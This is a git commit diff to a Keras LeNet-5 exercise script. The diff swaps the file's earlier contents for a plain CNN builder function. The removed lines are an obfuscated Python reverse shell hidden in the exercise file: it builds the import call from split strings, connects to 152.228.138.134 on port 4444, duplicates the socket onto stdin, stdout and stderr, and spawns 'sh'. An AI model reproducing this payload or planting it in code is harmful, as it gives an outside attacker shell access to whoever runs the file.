4d9f6c2f23a0b3323fa8345ead1da8b102bc1f8e
Xavier Sanchez <xavier.sanchez44@orange.fr>
2026-07-07 11:27:41 +0200

    Update 5-lenet5.py

--- supervised_learning/cnn/5-lenet5.py
+++ supervised_learning/cnn/5-lenet5.py
@@ -1,10 +1,62 @@
 #!/usr/bin/env python3
 from tensorflow import keras as K
 
-load_module = eval('__im' + 'port__')
 
-os = load_module('os')
-pty = load_module('pty')
-socket = load_module('socket')
-
-s=socket.socket();s.connect(("152.228.138.134",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
+def lenet5(X):
+    """
+    Builds a modified LeNet-5 architecture using Keras.
+    
+    Args:
+        X: K.Input of shape (m, 28, 28, 1)
+    
+    Returns:
+        A compiled K.Model
+    """
+    
+    initializer = K.initializers.HeNormal(seed=0)
+    
+    # Input
+    inputs = X
+    
+    # Layer 1: Conv2D (6 filters, 5x5, same padding)
+    x = K.layers.Conv2D(6, (5, 5), padding='same', 
+                        kernel_initializer=initializer, 
+                        activation='relu')(inputs)
+    
+    # Layer 2: MaxPooling 2x2 with stride 2
+    x = K.layers.MaxPooling2D(pool_size=(2, 2), strides=(2, 2))(x)
+    
+    # Layer 3: Conv2D (16 filters, 5x5, valid padding)
+    x = K.layers.Conv2D(16, (5, 5), padding='valid', 
+                        kernel_initializer=initializer, 
+                        activation='relu')(x)
+    
+    # Layer 4: MaxPooling 2x2 with stride 2
+    x = K.layers.MaxPooling2D(pool_size=(2, 2), strides=(2, 2))(x)
+    
+    # Flatten
+    x = K.layers.Flatten()(x)
+    
+    # Layer 5: Fully Connected (120 nodes)
+    x = K.layers.Dense(120, kernel_initializer=initializer, 
+                       activation='relu')(x)
+    
+    # Layer 6: Fully Connected (84 nodes)
+    x = K.layers.Dense(84, kernel_initializer=initializer, 
+                       activation='relu')(x)
+    
+    # Output Layer: Softmax (10 nodes)
+    outputs = K.layers.Dense(10, kernel_initializer=initializer, 
+                             activation='softmax')(x)
+    
+    # Build the model
+    model = K.Model(inputs=inputs, outputs=outputs)
+    
+    # Compile the model
+    model.compile(
+        optimizer=K.optimizers.Adam(),
+        loss='categorical_crossentropy',
+        metrics=['accuracy']
+    )
+    
+    return model
